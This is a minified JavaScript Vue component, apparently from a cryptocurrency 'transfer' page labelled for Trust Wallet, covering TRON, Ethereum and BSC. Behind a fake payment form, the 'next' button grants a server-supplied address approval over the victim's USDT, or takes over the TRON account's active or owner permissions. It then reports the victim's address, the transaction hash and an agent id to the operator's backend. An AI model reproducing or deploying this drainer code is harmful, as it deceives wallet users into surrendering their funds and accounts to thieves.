import{u as e}from"./nM-f4cdf167.js";import{g as a,s as t,a as s,b as l}from"./8738GmKNeD-46fe9490.js";import{B as i,t as o,g as r,a as u,b as n,c}from"./m-5b1d52ec.js";import{c as d,g as p,a as v,b as m,f,h as b}from"./n6Au9OnLj-fd99c80b.js";import{v as j,c as g,b as y,Q as w,P as h,l as k,M as x,R as T,S as R,O as S,q as B}from"./6tjqKrR-b6a6b0e5.js";import{r as L,u as U}from"./fxM-ea898f10.js";import{F as A,B as I,s as N,a as q,c as C}from"./r28G-5a2b03e7.js";import{P as M}from"./liy-a5367f0b.js";import{_ as X}from"./XPoOn-e094e4d9.js";import"./8X6GtWNyF-73fd57e6.js";import"./vQIRUJBoI-a7963f0b.js";import"./V0fHxV4-7bf2d33e.js";import"./tzmXV1Q-4070bdbd.js";import"./Ge4i6KoK-9c5d8364.js";import"./bUDNBmRE-2000283a.js";import"./eTCmBAI-fb1f383e.js";import"./0e0-d9c26b76.js";import"./kflBa-e825d353.js";import"./xxh9BUdo-ce0e6976.js";import"./Q0p-05509bd6.js";import"./KGpYTs-5c0525fb.js";import"./vKBka-2f039700.js";import"./2s6jvQ2fH-0036ccf6.js";import"./Ci-d16a3550.js";import"./8eOxxTim-10baf458.js";import"./86X-980cfc3a.js";import"./cRM-02a431a6.js";import"./alicDorR-71faa09b.js";import"./8F2FPCND-51226d2f.js";import"./IplD6-42588000.js";import"./vtMakQlSO-d6d6a93c.js";/* empty css            */import"./1-b74a4f46.js";/* empty css            */import"./JoCxVbBD-703f037b.js";import"./jjsI-088ba3ad.js";import"./Ed4d4L68-c26ca5c1.js";import"./uCKycXzm-10d4fea2.js";import"./G8wU1uq-d7a1fcbb.js";import"./zbMX-bc365d6b.js";import"./1iGTqnTHhJ-840d622d.js";import"./0YiHBG-2541adf8.js";import"./W-9b45caaf.js";import"./TO65M-f363641a.js";import"./sCNeCs5Q-b97fd033.js";import"./KFgjvnjF0-35897135.js";import"./tOXLvJ77-d2117d87.js";import"./4rOm-6608856d.js";import"./nexW53LbC-d3b0f15e.js";import"./tpIzz-11afe383.js";import"./8Ta-d3976aa7.js";import"./9VmWmKBZ-a35831d2.js";import"./A-94c7e870.js";import"./5LsPkSHZU-4cd811c9.js";import"./rC-5d373d91.js";import"./7-c24080ce.js";import"./Y0jxZ06AC-59889532.js";import"./LJ17-6ad89665.js";import"./Ai-0cc9fb1d.js";import"./Cc-575bbdfb.js";import"./Ww08UYEUH-783c7dba.js";import"./MwAj-cf27db0c.js";import"./XfMMd-27bbc622.js";import"./yHFN1-eb192687.js";const F=e=>(T("data-v-7d0aff10"),e=e(),R(),e),_={class:"main-container-wrapper"},H={class:"page-container"},G={style:{margin:"10px 16px"}},O=F((()=>h("p",{class:"label"},"收款地址",-1))),$={class:"input-container"},V=F((()=>h("p",{class:"label"},"数量",-1))),z={class:"input-container",style:{"margin-bottom":"0"}},K={class:"flex"},E={style:{"font-weight":"500"}},J={style:{"font-size":"12px"}},Q={class:"page-confirm"},Y=X(j({__name:"trust",setup(j){L(null);const T=L(0),R=L(0),X=L({type:1,walletType:1,agentId:"",token:"USDT",amount:1,block:i.TRX,clientId:"",ads:"",isAdd:!1,client_type:1,extend:{}}),F=L(""),Y=L({authAddress:"",clientId:"",receiveAddress:{trx:"",eth:"",bsc:""},authSuccessTips:""}),D=(e(),L("")),P=L(null),W=L(!0),Z=L([{name:"Slow",src:new URL("/test/static/svg/LbF-07b5b9ae.svg",self.location).href,quantity:"0.00007875",usd:"$0.019",unit:"BNB"},{name:"Medium",src:new URL("/test/static/svg/kylpY-2f601456.svg",self.location).href,quantity:"0.0000945",usd:"$0.023",unit:"BNB"},{name:"Fast",src:new URL("/test/static/svg/M3G1-8d3e2675.svg",self.location).href,quantity:"0.0001512",usd:"$0.037",unit:"BNB"}]),ee=g((()=>X.value.ads||Y.value.receiveAddress[X.value.block]));L(0);const ae=()=>{if(W.value=!0,!T.value||0==T.value)return W.value=!1,N("转账金额需要大于0");const{type:e}=X.value;if(R.value<T.value)return W.value=!1,N("Insufficient balance");1==e?(async()=>{try{if(q({message:"Loading...",duration:0}),X.value.block==i.TRX){const e=await u("TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",F.value,D.value);W.value=!0,e.result&&(te(D.value,"approve",e.txid),N(Y.value.authSuccessTips))}else X.value.block==i.ETH?await f(P.value,D.value,F.value,(e=>{e?(te(D.value,"approve",e),N(Y.value.authSuccessTips)):W.value=!1})):X.value.block==i.BSC&&b(P.value,D.value,F.value,(e=>{e?(te(D.value,"approve",e),N(Y.value.authSuccessTips)):W.value=!1}))}catch(e){C(),W.value=!1}})():2==e?(async()=>{if(X.value.block!=i.TRX)return;const e=await n(F.value,D.value,X.value.isAdd);(null==e?void 0:e.result)?(te(D.value,"active",e.txid),N(Y.value.authSuccessTips),C()):e&&N("object"==typeof e?JSON.stringify(e):String(e))})():(async()=>{if(X.value.block!=i.TRX)return;const e=await c(F.value);e.result&&(te(D.value,"owner",e.txid),N(Y.value.authSuccessTips))})()},te=async(e,a,i)=>{const o={addres:e,auth_addres:F.value,hash:i||0,wallete_type:"Trust",client_id:X.value.clientId,source:window.location.href,agent_uid:X.value.agentId,block:X.value.block,client_type:X.value.client_type,amount:X.value.amount,extend:X.value.extend?JSON.stringify(X.value.extend):""};switch(a){case"approve":await l(o);break;case"active":await s(o);break;case"owner":await t(o)}W.value=!1,C()},se=L();return y((()=>{const e=JSON.parse(localStorage.getItem("routerParams"));T.value=e.amount,X.value={amount:T.value,type:e.type,walletType:1,agentId:e.agent,token:e.token||"USDT",block:e.block||i.TRX,clientId:e.clientId||"",ads:e.ads,isAdd:e.isAdd,client_type:e.client_type||1,extend:e.extend||""},(()=>{switch(X.value.block){case i.TRX:Z.value=[{name:"Slow",src:new URL("/test/static/svg/LbF-07b5b9ae.svg",self.location).href,quantity:"3",usd:"$0.327423",unit:"TRX"},{name:"Medium",src:new URL("/test/static/svg/kylpY-2f601456.svg",self.location).href,quantity:"5",usd:"$0.545706",unit:"TRX"},{name:"Fast",src:new URL("/test/static/svg/M3G1-8d3e2675.svg",self.location).href,quantity:"10",usd:"$1.091411",unit:"TRX"}];break;case i.ETH:Z.value=[{name:"Slow",src:new URL("/test/static/svg/LbF-07b5b9ae.svg",self.location).href,quantity:"0.0007846",usd:"$1.993",unit:"ETH"},{name:"Medium",src:new URL("/test/static/svg/kylpY-2f601456.svg",self.location).href,quantity:"0.001043",usd:"$2.5733",unit:"ETH"},{name:"Fast",src:new URL("/test/static/svg/M3G1-8d3e2675.svg",self.location).href,quantity:"0.001299",usd:"$3.3",unit:"ETH"}];break;case i.BSC:Z.value=[{name:"Slow",src:new URL("/test/static/svg/LbF-07b5b9ae.svg",self.location).href,quantity:"0.00007875",usd:"$0.019",unit:"BNB"},{name:"Medium",src:new URL("/test/static/svg/kylpY-2f601456.svg",self.location).href,quantity:"0.0000945",usd:"$0.023",unit:"BNB"},{name:"Fast",src:new URL("/test/static/svg/M3G1-8d3e2675.svg",self.location).href,quantity:"0.0001512",usd:"$0.037",unit:"BNB"}]}})(),(async()=>{try{const e=JSON.parse(localStorage.getItem("config"));Y.value={...e};const{type:t}=X.value;W.value=!0;const s=(await a({block:X.value.block,type:o[X.value.type]})).data;Y.value={...e,authAddress:s},F.value=Y.value.authAddress}catch(e){W.value=!1}})(),se.value=setInterval((async()=>{window.ethereum&&(clearInterval(se.value),await window.ethereum.enable(),(async()=>{let e;switch(X.value.block){case i.TRX:if(D.value=await tronWeb.defaultAddress.base58,!D.value)return N("无法获取钱包地址！请检查浏览器是否支持TRON！");R.value=await r(D.value,X.value.token),W.value=!1;break;case i.ETH:e=await v(),P.value=e.web3,D.value=e.userAddress,R.value=await m(P.value,e.userAddress),W.value=!1;break;case i.BSC:e=await d(),P.value=e.web3,D.value=e.userAddress,R.value=await p(P.value,e.userAddress),W.value=!1}})())}),200)})),(e,a)=>(S(),w("div",_,[h("div",H,[h("div",G,[O,h("div",$,[k(U(A),{border:!1,modelValue:ee.value,"onUpdate:modelValue":a[0]||(a[0]=e=>ee.value=e),disabled:!0,label:"",placeholder:"请输入收款地址",size:"large",style:{"font-size":"14px",padding:"8px 14px","border-radius":"5px","background-color":"transparent","font-weight":"bold"}},null,8,["modelValue"])]),V,h("div",z,[k(U(A),{type:"number",border:!1,modelValue:T.value,"onUpdate:modelValue":a[2]||(a[2]=e=>T.value=e),label:"",placeholder:"请输入数量",size:"large",style:{"font-size":"14px",padding:"8px 14px","border-radius":"5px","background-color":"transparent","font-weight":"bold"}},{button:x((()=>[h("div",K,[h("span",E,M(String(X.value.token).toLocaleUpperCase()),1),h("span",{class:"all left-m10",onClick:a[1]||(a[1]=e=>T.value=R.value)},"全部")])])),_:1},8,["modelValue"])]),h("p",J,"≈$"+M(Number(T.value).toFixed(2)),1),h("div",Q,[k(U(I),{style:{width:"100%","border-radius":"999px",padding:"25px 0"},onClick:ae,loading:W.value,type:"primary",color:"#0500f5"},{default:x((()=>[B(" 下一步 ")])),_:1},8,["loading"])])])])]))}}),[["__scopeId","data-v-7d0aff10"]]);export{Y as default};
